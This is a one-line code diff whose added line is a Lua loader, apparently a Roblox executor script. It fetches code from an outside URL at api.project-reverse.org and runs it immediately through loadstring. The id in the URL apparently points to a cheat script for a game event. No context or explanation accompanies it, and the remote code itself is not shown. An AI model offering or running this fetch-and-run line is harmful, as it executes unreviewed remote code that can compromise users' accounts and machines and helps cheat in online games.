@@ -1,1 +1,1 @@
-buib
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6Im1tMnN1bW1lcmV2ZW50In19"))()
